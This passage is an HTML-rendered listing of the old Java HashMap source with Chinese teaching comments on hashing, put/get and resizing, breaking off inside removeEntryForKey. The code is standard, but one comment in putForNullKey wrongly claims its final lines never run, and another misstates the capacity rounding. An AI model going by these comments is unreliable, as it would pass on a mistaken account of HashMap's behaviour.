class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div><div class="line">554</div><div class="line">555</div><div class="line">556</div><div class="line">557</div><div class="line">558</div><div class="line">559</div><div class="line">560</div><div class="line">561</div><div class="line">562</div><div class="line">563</div><div class="line">564</div><div class="line">565</div><div class="line">566</div><div class="line">567</div><div class="line">568</div><div class="line">569</div><div class="line">570</div><div class="line">571</div><div class="line">572</div><div class="line">573</div><div class="line">574</div><div class="line">575</div><div class="line">576</div><div class="line">577</div><div class="line">578</div><div class="line">579</div><div class="line">580</div><div class="line">581</div><div class="line">582</div><div class="line">583</div><div class="line">584</div><div class="line">585</div><div class="line">586</div><div class="line">587</div><div class="line">588</div><div class="line">589</div><div class="line">590</div><div class="line">591</div><div class="line">592</div><div class="line">593</div><div class="line">594</div><div class="line">595</div><div class="line">596</div><div class="line">597</div><div class="line">598</div><div class="line">599</div><div class="line">600</div><div class="line">601</div><div class="line">602</div><div class="line">603</div><div class="line">604</div><div class="line">605</div><div class="line">606</div><div class="line">607</div><div class="line">608</div><div class="line">609</div><div class="line">610</div><div class="line">611</div><div class="line">612</div><div class="line">613</div><div class="line">614</div><div class="line">615</div><div class="line">616</div><div class="line">617</div><div class="line">618</div><div class="line">619</div><div class="line">620</div><div class="line">621</div><div class="line">622</div><div class="line">623</div><div class="line">624</div><div class="line">625</div><div class="line">626</div><div class="line">627</div><div class="line">628</div><div class="line">629</div><div class="line">630</div><div class="line">631</div><div class="line">632</div><div class="line">633</div><div class="line">634</div><div class="line">635</div><div class="line">636</div><div class="line">637</div><div class="line">638</div><div class="line">639</div><div class="line">640</div><div class="line">641</div><div class="line">642</div><div class="line">643</div><div class="line">644</div><div class="line">645</div><div class="line">646</div><div class="line">647</div><div class="line">648</div><div class="line">649</div><div class="line">650</div><div class="line">651</div><div class="line">652</div><div class="line">653</div><div class="line">654</div><div class="line">655</div><div class="line">656</div><div class="line">657</div><div class="line">658</div><div class="line">659</div><div class="line">660</div><div class="line">661</div><div class="line">662</div><div class="line">663</div><div class="line">664</div><div class="line">665</div><div class="line">666</div><div class="line">667</div><div class="line">668</div><div class="line">669</div><div class="line">670</div><div class="line">671</div><div class="line">672</div><div class="line">673</div><div class="line">674</div><div class="line">675</div><div class="line">676</div><div class="line">677</div><div class="line">678</div><div class="line">679</div><div class="line">680</div><div class="line">681</div><div class="line">682</div><div class="line">683</div><div class="line">684</div><div class="line">685</div><div class="line">686</div><div class="line">687</div><div class="line">688</div><div class="line">689</div><div class="line">690</div><div class="line">691</div><div class="line">692</div><div class="line">693</div><div class="line">694</div><div class="line">695</div><div class="line">696</div><div class="line">697</div><div class="line">698</div><div class="line">699</div><div class="line">700</div><div class="line">701</div><div class="line">702</div><div class="line">703</div><div class="line">704</div><div class="line">705</div><div class="line">706</div><div class="line">707</div><div class="line">708</div><div class="line">709</div><div class="line">710</div><div class="line">711</div><div class="line">712</div><div class="line">713</div><div class="line">714</div><div class="line">715</div><div class="line">716</div><div class="line">717</div><div class="line">718</div><div class="line">719</div><div class="line">720</div><div class="line">721</div><div class="line">722</div><div class="line">723</div><div class="line">724</div><div class="line">725</div><div class="line">726</div><div class="line">727</div><div class="line">728</div><div class="line">729</div><div class="line">730</div><div class="line">731</div><div class="line">732</div><div class="line">733</div><div class="line">734</div><div class="line">735</div><div class="line">736</div><div class="line">737</div><div class="line">738</div><div class="line">739</div><div class="line">740</div><div class="line">741</div><div class="line">742</div><div class="line">743</div><div class="line">744</div><div class="line">745</div><div class="line">746</div><div class="line">747</div><div class="line">748</div><div class="line">749</div><div class="line">750</div><div class="line">751</div><div class="line">752</div><div class="line">753</div><div class="line">754</div><div class="line">755</div><div class="line">756</div><div class="line">757</div><div class="line">758</div><div class="line">759</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> java.util;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"></div><div class="line"><span class="keyword">public</span> class <span class="keyword">HashMap</span>&lt;K,V&gt;</div><div class="line">    extends AbstractMap&lt;K,V&gt;</div><div class="line">    implements Map&lt;K,V&gt;, Cloneable, Serializable</div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="comment">// 默认的初始容量是16，必须是2的幂。</span></div><div class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">16</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 最大容量（必须是2的幂且小于2的30次方，传入容量过大将被这个值替换）</span></div><div class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> MAXIMUM_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 默认加载因子</span></div><div class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75</span>f;</div><div class="line"></div><div class="line">    <span class="comment">// 存储数据的Entry数组，长度是2的幂。</span></div><div class="line">    <span class="comment">// HashMap是采用拉链法实现的，每一个Entry本质上是一个单向链表</span></div><div class="line">    <span class="keyword">transient</span> Entry[] table;</div><div class="line"></div><div class="line">    <span class="comment">// HashMap的大小，它是HashMap保存的键值对的数量</span></div><div class="line">    <span class="keyword">transient</span> <span class="built_in">int</span> <span class="built_in">size</span>;</div><div class="line"></div><div class="line">    <span class="comment">// HashMap的阈值，用于判断是否需要调整HashMap的容量（threshold = 容量*加载因子）</span></div><div class="line">    <span class="built_in">int</span> threshold;</div><div class="line"></div><div class="line">    <span class="comment">// 加载因子实际大小</span></div><div class="line">    <span class="keyword">final</span> <span class="built_in">float</span> loadFactor;</div><div class="line"></div><div class="line">    <span class="comment">// HashMap被改变的次数</span></div><div class="line">    <span class="keyword">transient</span> <span class="keyword">volatile</span> <span class="built_in">int</span> modCount;</div><div class="line"></div><div class="line">    <span class="comment">// 指定“容量大小”和“加载因子”的构造函数</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">HashMap</span>(<span class="built_in">int</span> initialCapacity, <span class="built_in">float</span> loadFactor) &#123;</div><div class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</div><div class="line">                                               initialCapacity);</div><div class="line">        <span class="comment">// HashMap的最大容量只能是MAXIMUM_CAPACITY</span></div><div class="line">        <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</div><div class="line">            initialCapacity = MAXIMUM_CAPACITY;</div><div class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</div><div class="line">                                               loadFactor);</div><div class="line"></div><div class="line">        <span class="comment">// 找出“大于initialCapacity”的最小的2的幂</span></div><div class="line">        <span class="built_in">int</span> capacity = <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (capacity &lt; initialCapacity)</div><div class="line">            capacity &lt;&lt;= <span class="number">1</span>;</div><div class="line"></div><div class="line">        <span class="comment">// 设置“加载因子”</span></div><div class="line">        <span class="keyword">this</span>.loadFactor = loadFactor;</div><div class="line">        <span class="comment">// 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。</span></div><div class="line">        threshold = (<span class="built_in">int</span>)(capacity * loadFactor);</div><div class="line">        <span class="comment">// 创建Entry数组，用来保存数据</span></div><div class="line">        table = <span class="keyword">new</span> Entry[capacity];</div><div class="line">        init();</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// 指定“容量大小”的构造函数</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">HashMap</span>(<span class="built_in">int</span> initialCapacity) &#123;</div><div class="line">        <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 默认构造函数。</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">HashMap</span>() &#123;</div><div class="line">        <span class="comment">// 设置“加载因子”</span></div><div class="line">        <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</div><div class="line">        <span class="comment">// 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。</span></div><div class="line">        threshold = (<span class="built_in">int</span>)(DEFAULT_INITIAL_CAPACITY * DEFAULT_LOAD_FACTOR);</div><div class="line">        <span class="comment">// 创建Entry数组，用来保存数据</span></div><div class="line">        table = <span class="keyword">new</span> Entry[DEFAULT_INITIAL_CAPACITY];</div><div class="line">        init();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 包含“子Map”的构造函数</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">HashMap</span>(Map&lt;? extends K, ? extends V&gt; m) &#123;</div><div class="line">        <span class="keyword">this</span>(Math.<span class="built_in">max</span>((<span class="built_in">int</span>) (m.<span class="built_in">size</span>() / DEFAULT_LOAD_FACTOR) + <span class="number">1</span>,</div><div class="line">                      DEFAULT_INITIAL_CAPACITY), DEFAULT_LOAD_FACTOR);</div><div class="line">        <span class="comment">// 将m中的全部元素逐个添加到HashMap中</span></div><div class="line">        putAllForCreate(m);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">static</span> <span class="built_in">int</span> hash(<span class="built_in">int</span> h) &#123;</div><div class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</div><div class="line">        <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回索引值</span></div><div class="line">    <span class="comment">// h &amp; (length-1)保证返回值的小于length</span></div><div class="line">    <span class="keyword">static</span> <span class="built_in">int</span> indexFor(<span class="built_in">int</span> h, <span class="built_in">int</span> length) &#123;</div><div class="line">        <span class="keyword">return</span> h &amp; (length<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="built_in">int</span> <span class="built_in">size</span>() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">size</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="built_in">boolean</span> isEmpty() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">size</span> == <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 获取key对应的value</span></div><div class="line">    <span class="keyword">public</span> V <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">key</span> == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> getForNullKey();</div><div class="line">        <span class="comment">// 获取key的hash值</span></div><div class="line">        <span class="built_in">int</span> hash = hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="comment">// 在“该hash值对应的链表”上查找“键值等于key”的元素</span></div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</div><div class="line">             e != <span class="keyword">null</span>;</div><div class="line">             e = e.next) &#123;</div><div class="line">            <span class="keyword">Object</span> k;</div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || <span class="built_in">key</span>.equals(k)))</div><div class="line">                <span class="keyword">return</span> e.value;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 获取“key为null”的元素的值</span></div><div class="line">    <span class="comment">// HashMap将“key为null”的元素存储在table[0]位置！</span></div><div class="line">    <span class="keyword">private</span> V getForNullKey() &#123;</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[<span class="number">0</span>]; e != <span class="keyword">null</span>; e = e.next) &#123;</div><div class="line">            <span class="keyword">if</span> (e.<span class="built_in">key</span> == <span class="keyword">null</span>)</div><div class="line">                <span class="keyword">return</span> e.value;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// HashMap是否包含key</span></div><div class="line">    <span class="keyword">public</span> <span class="built_in">boolean</span> containsKey(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">        <span class="keyword">return</span> getEntry(<span class="built_in">key</span>) != <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“键为key”的键值对</span></div><div class="line">    <span class="keyword">final</span> Entry&lt;K,V&gt; getEntry(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">        <span class="comment">// 获取哈希值</span></div><div class="line">        <span class="comment">// HashMap将“key为null”的元素存储在table[0]位置，“key不为null”的则调用hash()计算哈希值</span></div><div class="line">        <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="comment">// 在“该hash值对应的链表”上查找“键值等于key”的元素</span></div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</div><div class="line">             e != <span class="keyword">null</span>;</div><div class="line">             e = e.next) &#123;</div><div class="line">            <span class="keyword">Object</span> k;</div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</div><div class="line">                ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || (<span class="built_in">key</span> != <span class="keyword">null</span> &amp;&amp; <span class="built_in">key</span>.equals(k))))</div><div class="line">                <span class="keyword">return</span> e;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 将“key-value”添加到HashMap中</span></div><div class="line">    <span class="keyword">public</span> V put(K <span class="built_in">key</span>, V value) &#123;</div><div class="line">        <span class="comment">// 若“key为null”，则将该键值对添加到table[0]中。</span></div><div class="line">        <span class="keyword">if</span> (<span class="built_in">key</span> == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> putForNullKey(value);</div><div class="line">        <span class="comment">// 若“key不为null”，则计算该key的哈希值，然后将其添加到该哈希值对应的链表中。</span></div><div class="line">        <span class="built_in">int</span> hash = hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="built_in">int</span> i = indexFor(hash, table.length);</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</div><div class="line">            <span class="keyword">Object</span> k;</div><div class="line">            <span class="comment">// 若“该key”对应的键值对已经存在，则用新的value取代旧的value。然后退出！</span></div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || <span class="built_in">key</span>.equals(k))) &#123;</div><div class="line">                V oldValue = e.value;</div><div class="line">                e.value = value;</div><div class="line">                e.recordAccess(<span class="keyword">this</span>);</div><div class="line">                <span class="keyword">return</span> oldValue;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 若“该key”对应的键值对不存在，则将“key-value”添加到table中</span></div><div class="line">        modCount++;</div><div class="line">        addEntry(hash, <span class="built_in">key</span>, value, i);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// putForNullKey()的作用是将“key为null”键值对添加到table[0]位置</span></div><div class="line">    <span class="keyword">private</span> V putForNullKey(V value) &#123;</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[<span class="number">0</span>]; e != <span class="keyword">null</span>; e = e.next) &#123;</div><div class="line">            <span class="keyword">if</span> (e.<span class="built_in">key</span> == <span class="keyword">null</span>) &#123;</div><div class="line">                V oldValue = e.value;</div><div class="line">                e.value = value;</div><div class="line">                e.recordAccess(<span class="keyword">this</span>);</div><div class="line">                <span class="keyword">return</span> oldValue;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 这里的完全不会被执行到!</span></div><div class="line">        modCount++;</div><div class="line">        addEntry(<span class="number">0</span>, <span class="keyword">null</span>, value, <span class="number">0</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 创建HashMap对应的“添加方法”，</span></div><div class="line">    <span class="comment">// 它和put()不同。putForCreate()是内部方法，它被构造函数等调用，用来创建HashMap</span></div><div class="line">    <span class="comment">// 而put()是对外提供的往HashMap中添加元素的方法。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">void</span> putForCreate(K <span class="built_in">key</span>, V value) &#123;</div><div class="line">        <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="built_in">int</span> i = indexFor(hash, table.length);</div><div class="line"></div><div class="line">        <span class="comment">// 若该HashMap表中存在“键值等于key”的元素，则替换该元素的value值</span></div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</div><div class="line">            <span class="keyword">Object</span> k;</div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</div><div class="line">                ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || (<span class="built_in">key</span> != <span class="keyword">null</span> &amp;&amp; <span class="built_in">key</span>.equals(k)))) &#123;</div><div class="line">                e.value = value;</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 若该HashMap表中不存在“键值等于key”的元素，则将该key-value添加到HashMap中</span></div><div class="line">        createEntry(hash, <span class="built_in">key</span>, value, i);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 将“m”中的全部元素都添加到HashMap中。</span></div><div class="line">    <span class="comment">// 该方法被内部的构造HashMap的方法所调用。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">void</span> putAllForCreate(Map&lt;? extends K, ? extends V&gt; m) &#123;</div><div class="line">        <span class="comment">// 利用迭代器将元素逐个添加到HashMap中</span></div><div class="line">        <span class="keyword">for</span> (Iterator&lt;? extends Map.Entry&lt;? extends K, ? extends V&gt;&gt; i = m.entrySet().iterator(); i.hasNext(); ) &#123;</div><div class="line">            Map.Entry&lt;? extends K, ? extends V&gt; e = i.next();</div><div class="line">            putForCreate(e.getKey(), e.getValue());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 重新调整HashMap的大小，newCapacity是调整后的单位</span></div><div class="line">    <span class="keyword">void</span> resize(<span class="built_in">int</span> newCapacity) &#123;</div><div class="line">        Entry[] oldTable = table;</div><div class="line">        <span class="built_in">int</span> oldCapacity = oldTable.length;</div><div class="line">        <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</div><div class="line">            threshold = Integer.MAX_VALUE;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 新建一个HashMap，将“旧HashMap”的全部元素添加到“新HashMap”中，</span></div><div class="line">        <span class="comment">// 然后，将“新HashMap”赋值给“旧HashMap”。</span></div><div class="line">        Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</div><div class="line">        transfer(newTable);</div><div class="line">        table = newTable;</div><div class="line">        threshold = (<span class="built_in">int</span>)(newCapacity * loadFactor);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 将HashMap中的全部元素都添加到newTable中</span></div><div class="line">    <span class="keyword">void</span> transfer(Entry[] newTable) &#123;</div><div class="line">        Entry[] src = table;</div><div class="line">        <span class="built_in">int</span> newCapacity = newTable.length;</div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) &#123;</div><div class="line">            Entry&lt;K,V&gt; e = src[j];</div><div class="line">            <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</div><div class="line">                src[j] = <span class="keyword">null</span>;</div><div class="line">                do &#123;</div><div class="line">                    Entry&lt;K,V&gt; next = e.next;</div><div class="line">                    <span class="built_in">int</span> i = indexFor(e.hash, newCapacity);</div><div class="line">                    e.next = newTable[i];</div><div class="line">                    newTable[i] = e;</div><div class="line">                    e = next;</div><div class="line">                &#125; <span class="keyword">while</span> (e != <span class="keyword">null</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 将"m"的全部元素都添加到HashMap中</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> putAll(Map&lt;? extends K, ? extends V&gt; m) &#123;</div><div class="line">        <span class="comment">// 有效性判断</span></div><div class="line">        <span class="built_in">int</span> numKeysToBeAdded = m.<span class="built_in">size</span>();</div><div class="line">        <span class="keyword">if</span> (numKeysToBeAdded == <span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span>;</div><div class="line"></div><div class="line">        <span class="comment">// 计算容量是否足够，</span></div><div class="line">        <span class="comment">// 若“当前实际容量 &lt; 需要的容量”，则将容量x2。</span></div><div class="line">        <span class="keyword">if</span> (numKeysToBeAdded &gt; threshold) &#123;</div><div class="line">            <span class="built_in">int</span> targetCapacity = (<span class="built_in">int</span>)(numKeysToBeAdded / loadFactor + <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span> (targetCapacity &gt; MAXIMUM_CAPACITY)</div><div class="line">                targetCapacity = MAXIMUM_CAPACITY;</div><div class="line">            <span class="built_in">int</span> newCapacity = table.length;</div><div class="line">            <span class="keyword">while</span> (newCapacity &lt; targetCapacity)</div><div class="line">                newCapacity &lt;&lt;= <span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (newCapacity &gt; table.length)</div><div class="line">                resize(newCapacity);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 通过迭代器，将“m”中的元素逐个添加到HashMap中。</span></div><div class="line">        <span class="keyword">for</span> (Iterator&lt;? extends Map.Entry&lt;? extends K, ? extends V&gt;&gt; i = m.entrySet().iterator(); i.hasNext(); ) &#123;</div><div class="line">            Map.Entry&lt;? extends K, ? extends V&gt; e = i.next();</div><div class="line">            put(e.getKey(), e.getValue());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 删除“键为key”元素</span></div><div class="line">    <span class="keyword">public</span> V remove(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">        Entry&lt;K,V&gt; e = removeEntryForKey(<span class="built_in">key</span>);</div><div class="line">        <span class="keyword">return</span> (e == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 删除“键为key”的元素</span></div><div class="line">    <span class="keyword">final</span> Entry&lt;K,V&gt; removeEntryForKey(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">        <span class="comment">// 获取哈希值。若key为null，则哈希值为0；否则调用hash()进行计算</span></div><div class="line">        <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="built_in">int</span> i = indexFor(hash, table.length);</div><div class="line">        Entry&lt;K,V&gt; prev = table[i];</div><div class="line">        Entry&lt;K,V&gt; e = prev;</div><div class="line"></div><div class="line">        <span class="comment">// 删除链表中“键为key”的元素</span></div><div class="line">        <span class="comment">// 本质是“删除单向链表中的节点”</span></div><div class="line">        <span class="keyword">while</span> (e != <span class="keyword">null</span>) &#123;</div><div class="line">            Entry&lt;K,V&gt; next 